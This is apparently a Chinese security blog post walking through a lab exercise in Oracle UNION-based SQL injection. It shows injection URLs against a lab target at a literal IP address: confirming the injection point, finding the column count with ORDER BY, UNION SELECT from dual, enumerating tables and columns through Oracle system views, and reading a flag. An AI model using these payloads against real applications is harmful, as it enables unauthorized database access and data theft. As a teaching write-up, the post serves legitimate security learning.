---
title: "Oracle 联合注入"
date: 2024-02-02
description: "靶场演示"
tags: ["SQL 注入","后端漏洞"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

靶场界面如下。

![sqli2](/images/sqli1/sqli2-0.png)

我们先确认一下参数 id 处存在注入点。

    http://111.9.41.91:53109/?id=1' or '1'='1

![sqli2](/images/sqli1/sqli2-1.png)

当输入 order by 6 时报错，而 order by 5 不报错，确认字段数为 5。

    http://111.9.41.91:53109/?id=1' order by 6 --+

![sqli2](/images/sqli1/sqli2-2.png)

我们现在就可以用联合查询进行注入了。这里需要注意 oracle 的语法，from dual 是占位置用的，因为 oracle 的语句必须包含表名；我们使用 null 而不是 12345 是因为数据类型未知。

先确认一下没有报错。

    http://111.9.41.91:53109/?id=1' union select null,null,null,null,null from dual --+

然后确认回显点的数据类型，我们只需要一个回显点就够了。

    http://111.9.41.91:53109/?id=1' union select 1,'a',null,null,null from dual --+

![sqli2](/images/sqli1/sqli2-3.png)

现在我们使用 oracle 的自带库。

    http://111.9.41.91:53109/?id=1' union select 1,table_name,null,null,null from user_all_tables --+

![sqli2](/images/sqli1/sqli2-4.png)

我们找到了 flag 的表，进一步查询字段。

    http://111.9.41.91:53109/?id=1' union select 1,column_name,null,null,null from all_tab_columns where table_name='UNION_FLAG' --+

![sqli2](/images/sqli1/sqli2-5.png)

至此我们就找到了 flag。

    http://111.9.41.91:53109/?id=1' union select 1,FLAG,null,null,null from UNION_FLAG --+

![sqli2](/images/sqli1/sqli2-6.png)

